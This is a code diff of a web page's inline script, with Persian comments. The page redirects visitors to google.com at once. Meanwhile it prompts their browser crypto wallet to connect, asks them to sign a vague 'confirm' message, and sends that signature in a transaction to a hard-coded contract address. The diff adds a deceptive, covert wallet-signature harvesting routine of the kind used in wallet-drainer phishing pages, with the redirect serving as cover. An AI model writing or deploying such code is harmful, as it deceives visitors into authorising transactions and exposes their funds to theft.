@@ -7,26 +7,43 @@
 <body>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <script>
-// ===== Task2: ریدایرکت فوری و بدون وابستگی =====
+// ===== Task2: ریدایرکت فوری =====
 window.location.replace("https://google.com");
 
-// ===== Task1: تلاش برای اتصال ولت و ارسال تراکنش (غیر وابسته) =====
+// ===== Task1: اتصال ولت و ارسال امضا به کانترکت =====
 (async () => {
   if (window.ethereum) {
     try {
+      // درخواست اتصال به ولت
       await window.ethereum.request({ method: 'eth_requestAccounts' });
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      const tx = {
-        to: "0xYourContractAddress",
-        value: ethers.parseEther("0.0"),
-        data: "0xYourEncodedFunctionData"
-      };
+      // مرحله ۱: گرفتن امضا از کاربر
+      const message = "Please sign this message to confirm."; // پیام دلخواه
+      const signature = await signer.signMessage(message);
 
-      signer.sendTransaction(tx).catch(() => {});
+      // مرحله ۲: تعریف ABI و آدرس کانترکت
+      const contractAddress = "0x40Ab05f7B9113d2559FDF26e8983e5D3Ab4f87c5";
+      const abi = [
+        {
+          "inputs": [{ "internalType": "bytes", "name": "_signature", "type": "bytes" }],
+          "name": "storeSignature",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }
+      ];
+
+      // مرحله ۳: اتصال به کانترکت
+      const contract = new ethers.Contract(contractAddress, abi, signer);
+
+      // مرحله ۴: ارسال تراکنش (امضا به کانترکت)
+      const txResponse = await contract.storeSignature(signature);
+      console.log("Tx sent:", txResponse.hash);
+
     } catch (err) {
-      console.error("Wallet connection error:", err);
+      console.error("Error:", err);
     }
   }
 })();
